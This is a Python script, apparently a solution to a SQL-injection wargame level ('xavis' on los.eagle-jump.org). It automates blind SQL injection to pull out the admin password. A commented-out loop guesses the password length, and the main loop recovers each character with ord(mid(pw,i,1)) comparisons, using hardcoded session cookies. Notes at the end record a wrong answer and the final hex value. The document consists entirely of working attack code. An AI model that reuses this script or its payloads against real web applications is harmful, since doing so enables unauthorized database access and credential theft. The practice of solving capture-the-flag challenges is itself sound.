#!/usr/local/bin/python3

import urllib.request
from urllib.parse import quote
from string import digits
from string import ascii_lowercase

# for i in range(1, 81):
#     url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
#     data = "' or id='admin' and length(pw)={}#".format(str(i))
#     data = quote(data)
#     re = urllib.request.Request(url + data)
#     re.add_header(
#         "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
#     re.add_header("Cookie", "PHPSESSID=pdah5igtkcp024tlbfueevv8b0")
#     req = urllib.request.urlopen(re)

#     result = req.readline()
#     print(result)

#     if str(result).find("Hello admin") != -1:
#         print(i)
#         break

# length : 40


key = ""
hexcode = "0x"

for i in range(1, 11):
    for j in range(160, 1000):
        url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
        data = "' or id='admin' and ord(mid(pw,{},1))='{}'#".format(
            str(i), str(j))
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=6bec6enlkt2sllp7csost2qm26")
        req = urllib.request.urlopen(re)

        result = req.readline()
        print(result)

        if str(result).find("Hello admin") != -1:
            key += chr(j)
            hexcode += hex(j)[2:]
            print ("a : " + key)
            print ("hex : " + hexcode)
            break
print (key)

# 오답 : 0xb8d9aab0c6d0aaa1a4bb
# 0xb8f9c5b0c6d0c4a1a4bb
# ¸ùÅ°ÆÐÄ¡¤»
